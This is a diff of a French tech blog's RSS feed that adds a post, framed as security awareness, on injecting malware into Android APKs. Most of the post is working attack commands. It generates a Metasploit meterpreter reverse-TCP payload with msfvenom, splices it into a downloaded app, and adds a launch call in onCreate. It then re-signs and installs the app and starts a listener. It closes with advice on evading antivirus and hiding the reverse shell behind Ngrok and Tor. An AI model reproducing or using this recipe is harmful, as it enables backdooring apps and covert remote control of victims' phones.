@@ -185,7 +185,9 @@ mv heimdall-startup.sh heimdall/scripts
   &quot;catching_up&quot;: false
 }
 ...
-</code></pre>]]></content>
+</code></pre><br/>
+<p>Tout est ok si vous avez <code>&quot;catching_up&quot;: false</code></p>
+]]></content>
         </item>
         
         <item>
@@ -1927,6 +1929,115 @@ python3
 &gt;&gt;&gt; from tensorflow.python.client import device_lib
 &gt;&gt;&gt; print(device_lib.list_local_devices())
 </code></pre>]]></content>
+        </item>
+        
+        <item>
+            <title>Comprendre les failles de certains APKs Android</title>
+            <link>https://leandeep.com/comprendre-les-failles-de-certains-apks-android/</link>
+            <pubDate>Fri, 13 Nov 2020 16:49:00 +0200</pubDate>
+            
+            <guid>https://leandeep.com/comprendre-les-failles-de-certains-apks-android/</guid>
+            <description>Introduction L&amp;rsquo;objectif de cet article est de sensibiliser à la sécurité sur Android. Ce n&amp;rsquo;est pas très compliqué d&amp;rsquo;injecter des virus (très) néfastes dans des APKs disponibles sur internet. Surtout n&amp;rsquo;installez pas des APKs qui ne proviennent pas des Stores Officiels d&amp;rsquo;Apple ou Google sans savoir ce que vous faites.
+ Installation sur Kali apktool
+mkdir ~/Dev/Android cd $_ wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.4.1.jar mv apktool_*.jar apktool.jar wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool mv * /usr/local/bin chmod +x /usr/local/bin/apktool.</description>
+            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
+<p>L&rsquo;objectif de cet article est de sensibiliser à la sécurité sur Android. Ce n&rsquo;est pas très compliqué d&rsquo;injecter des virus (très) néfastes dans des APKs disponibles sur internet. Surtout n&rsquo;installez pas des APKs qui ne proviennent pas des Stores Officiels d&rsquo;Apple ou Google sans savoir ce que vous faites.</p>
+<br/>
+<h2 id="installation-sur-kali">Installation sur Kali</h2>
+<p><strong>apktool</strong></p>
+<pre><code>mkdir ~/Dev/Android
+cd $_
+wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.4.1.jar
+mv apktool_*.jar apktool.jar
+wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
+mv * /usr/local/bin
+chmod +x /usr/local/bin/apktool.jar
+chmod +x /usr/local/bin/apktool
+</code></pre><br/>
+<p><strong>zipalign</strong></p>
+<pre><code>apt install zipalign
+</code></pre><br/>
+<p><strong>jarsigner</strong></p>
+<pre><code>apt install openjdk-14-jdk-headless
+</code></pre><br/>
+<h2 id="génération-et-injection-du-payload-et-signature-de-lapk">Génération et injection du Payload et signature de l&rsquo;APK</h2>
+<p><strong>Download apk de test</strong></p>
+<p>Rendez-vous sur <a href="https://www.apkmirror.com/">https://www.apkmirror.com/</a> et télécharger un APK.</p>
+<br/>
+<p><strong>Création payload</strong></p>
+<p>Récupérer l&rsquo;IP de la machine qui exploitera la vulnérabilité
+ifconfig</p>
+<p>Configurer et générer le payload qui sera injecté dans l&rsquo;APK</p>
+<pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.17 LPORT=443 M&gt; ~/Dev/Android/payload.apk
+</code></pre><blockquote>
+<p>Vocabulaire Metasploit:</p>
+<ul>
+<li>LHOST: IP de l’attaquant</li>
+<li>LPORT: Port utilisé</li>
+<li>RHOST: IP de la victime</li>
+<li>RPORT: Port de la victime</li>
+</ul>
+</blockquote>
+<br/>
+<p><strong>Desassembler les APKs</strong></p>
+<pre><code>apktool d payload.apk
+apktool d mon_apk_avec_virus.apk
+</code></pre><br/>
+<p><strong>Ajouter le payload à l&rsquo;APK</strong></p>
+<pre><code>cp -R payload/smali/com/metasploit mon_apk_avec_virus/smali/com/
+</code></pre><br/>
+<p><strong>Ajouter la commande permettant de lancer le payload lors de l&rsquo;appel à la fonction <code>onCreate</code></strong></p>
+<p>En d&rsquo;autres termes, injecter le main activity du payload dans l&rsquo;APK après l&rsquo;appel du onCreate.</p>
+<p>Ligne suivante à ajouter dans le fichier <code>mon_apk_avec_virus/smali/com/company_name/mon_apk_avec_virus/SplashScreen.smali</code></p>
+<pre><code>invoke-static {p0}, Lcom/metasploit/stage/Payload;-&gt;start(Landroid/content/Context;)V
+</code></pre><br/>
+<p><strong>Ajouter les permissions à l&rsquo;APK virus</strong></p>
+<p>Copier toutes les permissions identifiées par les lignes XML <code>&lt;uses-permission...</code> du fichier <code>payload/AndroidManifest.xml</code> dans <code>mon_apk_avec_virus/AndroidManifest.xml</code>.</p>
+<br/>
+<p><strong>Générer son propre certificat</strong></p>
+<pre><code>keytool -genkey -V -keystore /root/Dev/Android/key.keystore -alias education_purpose -keyalg RSA -keysize 2048 -validity 1000
+</code></pre><br/>
+<p><strong>Signer son nouveau APK</strong></p>
+<pre><code>jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore /root/Dev/Android/key.keystore ./mon_apk_avec_virus_signed.apk education_purpose
+</code></pre><br/>
+<p><strong>Zipalign</strong></p>
+<pre><code>zipalign -v 4 ./mon_apk_avec_virus_signed.apk mon_apk_avec_virus.apk
+</code></pre><br/>
+<h2 id="installation-sur-device-cible">Installation sur device cible</h2>
+<blockquote>
+<p>Vérifier comment installer un apk sans qu&rsquo;Android soit en mode developer.</p>
+</blockquote>
+<pre><code>adb devices
+adb install -r mon_apk_avec_virus.apk
+</code></pre><br/>
+<h2 id="exploitation">Exploitation</h2>
+<pre><code>msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set lport 443
+set lhost 192.168.0.17
+exploit
+help
+</code></pre><p>Testez par vous-même pour découvrir le fonctionnement de ces techniques et donc pour mieux vous protéger mais n&rsquo;utilisez pas cette technique pour pirater autrui.</p>
+<br/>
+<h2 id="aller-plus-loin">Aller plus loin</h2>
+<ul>
+<li>
+<p>Utiliser un encoder afin que les antivirus ne détectent pas ces payloads</p>
+</li>
+<li>
+<p>Utiliser un reverse shell anonyme avec Ngrok et connect-back.</p>
+</li>
+</ul>
+<p>Utiliser par exemple les commandes suivantes:</p>
+<p><code>./ngrok tcp 9999</code>.</p>
+<p><em>Forwarding tcp://0.tcp.ngrok.io:11811 -&gt; localhost:9999</em></p>
+<p>Puis <code>LHOST=0.tcp.ngrok.io</code> et <code>LPORT=11811</code> dans la commande <code>msfvenom</code> précédente.</p>
+<p>Et enfin <code>set LHOST 0.0.0.0</code> et <code>set LPORT 9999</code> dans meterpreter listener.</p>
+<ul>
+<li>Utiliser un reverse shell anonyme avec Ngrok et connect-back avec Tor entre les deux (ie: <code>socks5_proxy: &quot;socks5://127.0.0.1:9050&quot;</code> dans <code>ngrok.yml</code>)</li>
+</ul>
+]]></content>
         </item>
         
         <item>
